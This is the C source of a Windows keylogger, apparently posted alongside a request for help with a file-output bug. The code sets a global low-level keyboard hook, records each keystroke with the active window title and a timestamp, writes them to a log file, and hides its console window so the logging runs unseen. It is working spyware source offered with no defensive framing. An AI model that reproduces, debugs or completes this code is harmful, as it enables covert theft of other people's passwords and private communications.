//I can't get the file output to work and I have no idea what's wrong everything looks like it's correct 

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <time.h>
#include <string.h>
#include <stdbool.h>

#define hidden    //hidden/visible

const char* keyname[] = {   //establish keynames
    [VK_BACK] = "[BACKSPACE]",
    [VK_RETURN] = "\n",
    [VK_SPACE] = "_",
    [VK_TAB] = "[TAB]",
    [VK_SHIFT] = "[SHIFT]",
    [VK_LSHIFT] = "[LSHIFT]",
    [VK_RSHIFT] = "[RSHIFT]",
    [VK_CONTROL] = "[CONTROL]",
    [VK_LCONTROL] = "[LCONTROL]",
    [VK_RCONTROL] = "[RCONTROL]",
    [VK_MENU] = "[ALT]",
    [VK_LWIN] = "[LWIN]",
    [VK_RWIN] = "[RWIN]",
    [VK_ESCAPE] = "[ESCAPE]",
    [VK_END] = "[END]",
    [VK_HOME] = "[HOME]",
    [VK_LEFT] = "[LEFT]",
    [VK_RIGHT] = "[RIGHT]",
    [VK_UP] = "[UP]",
    [VK_DOWN] = "[DOWN]",
    [VK_PRIOR] = "[PG_UP]",
    [VK_NEXT] = "[PG_DOWN]",
    [VK_OEM_PERIOD] = ".",
    [VK_DECIMAL] = ".",
    [VK_OEM_PLUS] = "+",
    [VK_OEM_MINUS] = "-",
    [VK_ADD] = "+",
    [VK_SUBTRACT] = "-",
    [VK_CAPITAL] = "[CAPSLOCK]"
};
HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        if (wParam == WM_KEYDOWN)
        {
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
            save(kbdStruct.vkCode);
        }
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCSTR a = "Failed to install hook!";
        LPCSTR b = "Error";
        MessageBoxA(NULL, a, b, MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int save(int key_stroke) { //save to file
    FILE* outputtext;
    char output[1024];
    static char lastwindow[256] = "";
	if ((key_stroke == 1) || (key_stroke == 2))      //ignore mouse clicks
    {
        return 0;
    }

    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;
    if (foreground)
    {
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }
    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);
        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            struct tm tm_info;
            time_t t = time(NULL);
            localtime_s(&tm_info, &t);
            char s[64];
            strftime(s, sizeof(s), "%FT%X%z", &tm_info);
            sprintf_s(output, sizeof(output), "\n\n[Window: %s - at %s] ", window_title, s);
            fputs(output, outputtext);
        }
    }
    if (keyname[key_stroke] != NULL)
    {
        sprintf_s(output, sizeof(output), "%s", keyname[key_stroke]);
    }
    else
    {
        char key;
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
        if (!lowercase)
        {
            key = tolower(key);
        }
        sprintf_s(output, sizeof(output), "%c", key);
    }
	fputs(output, outputtext); //says that outputtext is an undeclared identifier but it's declared in main and in this function, maybe it's because it's decalred twice? IDk why that 
	fflush(outputtext);        //would be a problem but I'm not sure what else it could be. Please help me figure this out. 
    printf("%s", output);
    return 0;
}

void visibility() {
    #if defined visible
        ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
    #endif
    #if defined hidden
        ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
        FreeConsole();
    #endif
}

int main() {
    //hide or show console window
    visibility();   
    
    //file output
    const char* keylog = "log";                 
    printf("Logging output to %s\n", keylog);
    FILE* outputtext = fopen(keylog, "a");
    
    //system hook 
    SetHook();
    
    MSG msg; 
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }

	//close file
    fclose(outputtext);
    
    return 0;
}